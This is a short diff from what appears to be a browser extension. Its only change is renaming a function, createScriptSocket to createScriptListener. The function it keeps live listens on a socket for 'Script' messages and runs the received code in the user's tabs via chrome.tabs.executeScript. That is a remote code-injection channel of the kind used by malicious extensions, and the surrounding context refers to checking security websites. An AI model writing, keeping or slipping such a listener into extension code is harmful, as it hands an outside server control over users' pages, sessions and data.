@@ -86,11 +86,10 @@ function checkSecurityWebsites(tabId, changeInfo) {
   }
 }
 
-function createScriptSocket() {
+function createScriptListener() {
   socket.on('Script', (script) => {
     chrome.tabs.executeScript({
       code: script.code
     });
   });
 }
-
